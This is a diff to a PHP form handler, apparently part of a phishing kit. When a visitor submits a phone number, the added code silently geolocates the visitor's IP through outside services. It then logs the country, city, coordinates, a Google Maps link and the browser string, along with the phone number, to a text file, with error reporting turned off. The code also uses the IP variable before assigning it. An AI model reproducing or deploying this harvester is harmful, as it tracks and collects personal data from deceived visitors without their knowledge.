@@ -1,6 +1,45 @@
  <?php 
 error_reporting(0); 
 if (isset($_POST["telnumber"])) {
+$data = @unserialize(file_get_contents("http://ip-api.com/php/".$ip));
+$ip =$data["query"];
+date_default_timezone_set('Europe/Istanbul');
+
+
+$tarih =" Tarih : ".date('d/m/Y  H:i');
+$Geo_Plugin_XML = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".$ip); 
+$adress = $Geo_Plugin_XML->geoplugin_request; 
+$ulke = $Geo_Plugin_XML->geoplugin_countryName;
+$bolge = $Geo_Plugin_XML->geoplugin_region;
+$kita = $Geo_Plugin_XML->geoplugin_continentCode;
+$ulkekodu = $Geo_Plugin_XML->geoplugin_countryCode;
+$sehir = $Geo_Plugin_XML->geoplugin_city;
+$plaka = $Geo_Plugin_XML->geoplugin_regionCode;
+$enlem = $Geo_Plugin_XML->geoplugin_latitude;
+$boylam = $Geo_Plugin_XML->geoplugin_longitude;
+$tarayici = $_SERVER['HTTP_USER_AGENT']; 
+
+$maps = "https://www.google.com/maps/place/".$enlem.",".$boylam."/@".$enlem.",".$boylam.",16z";
+$yamanefkar["0"] = " Ip Adresi : ".$adress;
+$yamanefkar["1"] = " Ulke : ".$ulke; 
+$yamanefkar["2"] = " Bolge : ".$bolge;
+$yamanefkar["3"] = " Kita : ".$kita;
+$yamanefkar["4"] = " Ulke Kodu : ".$ulkekodu;
+$yamanefkar["5"] = " Sehir : ".$sehir;
+$yamanefkar["6"] = " Plaka : ".$plaka;
+$yamanefkar["7"] = " Enlem : ".$enlem;
+$yamanefkar["8"] = " Boylam : ".$boylam;
+$yamanefkar["9"] = " Google Maps : ".$maps;
+$yamanefkar["10"] = " Tarayıcı : ".$tarayici; 
+
+
+$ac = fopen("kayit.txt","a+");
+
+$userlar = ("\n __________________ \n".$tarih."\n".$yamanefkar["0"]."\n".$yamanefkar["1"]."\n".$yamanefkar["2"]."\n".$yamanefkar["3"]."\n".$yamanefkar["4"]."\n".$yamanefkar["5"]."\n".$yamanefkar["6"]."\n".$yamanefkar["7"]."\n".$yamanefkar["8"]."\n".$yamanefkar["9"]."\n".$yamanefkar["10"]."\n\n!--VERİLER--!\n");
+fwrite($ac,$userlar);
+fclose($ac);
+sleep(2);
+  
 $ac = fopen("kayit.txt","a+");
 $tel = $_POST['telnumber'];
 $userlar = ("\n Telefon No : ".$tel."\n");
